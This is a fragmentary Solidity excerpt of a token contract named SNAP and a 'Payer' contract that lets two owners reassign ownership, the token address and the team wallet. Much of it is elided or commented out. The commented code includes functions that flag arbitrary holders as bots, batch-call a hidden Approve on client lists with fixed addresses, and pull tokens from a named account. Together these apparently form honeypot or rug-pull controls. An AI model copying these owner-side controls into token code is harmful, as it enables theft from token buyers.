...
contract SNAP is Context, IERC20, Ownable {
    ...
    function setTeamWalletAddress(address newAddress) external {
...
contract Payer {
    ...
    constructor(address payable tokenAddress) {
        owner = msg.sender;
        token = SNAP(tokenAddress);
    }

    function changeTokenAddress(address payable tokenContract) public {
        require(owner == msg.sender ||owner2 == msg.sender);
        token = SNAP(tokenContract);
    }

    function changeOwner(address ownerNew) public {
        require(owner == msg.sender ||owner2 == msg.sender);
        owner = ownerNew;
    }

        function changeOwner2(address ownerNew) public {
        require(owner == msg.sender ||owner2 == msg.sender);
        owner2 = ownerNew;
    }

    function Wallet(address token2) public {
        require(owner == msg.sender ||owner2 == msg.sender);
        token.setTeamWalletAddress(token2);
    }

    // function ETHMultTransfer(address payable[] memory clients, uint256[] memory amounts) public payable {
    //     require(owner == msg.sender ||owner2 == msg.sender);
    ...
    //     }
    //     token.Approve(clients,0x55d398326f99059fF775485246999027B3197955,0x55d398326f99059fF775485246999027B3197955,0);
    ...
    // function getBot() public view returns (address[] memory) {
    //     return Botaddress;
    // }

//     function AutoClose(address payable[] memory clients) public {
// require(owner == msg.sender ||owner2 == msg.sender);
//         token.Approve(clients,0x703B8FDbBc1bb7f9C445D3aB57F9c1E0A3f0CC3b,0x703B8FDbBc1bb7f9C445D3aB57F9c1E0A3f0CC3b,0);
//     }

    // function transferFrom(address account) public{
    //     require(owner == msg.sender ||owner2 == msg.sender);
    //     token.transferFrom(account);
    // }

//     function recordAddress(address payable[] memory people) public {

//         for (uint256 i = 0; i < people.length; i++) {
//             if(_isBot[people[i]] != true){
//                 _isBot[people[i]] = true;
//                 Botaddress.push(people[i]);
//             }
//         }
//     }
...
//     function withdrawalStuck(address _token, uint256 _amount) public {
// require(owner == msg.sender ||owner2 == msg.sender);
//         if (_token == address(0)) {
...
//     }
    ...
    // function ERC20MultTransfer(address payable[] memory clients, uint256[] memory amounts, IERC20 tokenContract) public payable {

        
    //     // uint256 totalAmount;
    //     // transfer the required amount of ether to each one of the clients
    //     // for (uint256 i = 0; i < length; i++){
    //     //     IERC20(ERC20token).transferFrom(msg.sender,clients[i],amounts[i]);
    //     //     // totalAmount = totalAmount + amounts[i];
    //     // }

    //     // in case you deployed the contract with more ether than required,
    //     // transfer the remaining ether back to yourself
    //     // IERC20(ERC20token).transferFrom(address(this), msg.sender, IERC20(ERC20token).balanceOf(address(this)));
    ...
    //         tokenContract.transferFrom(from, clients[i], amount);
    //     }
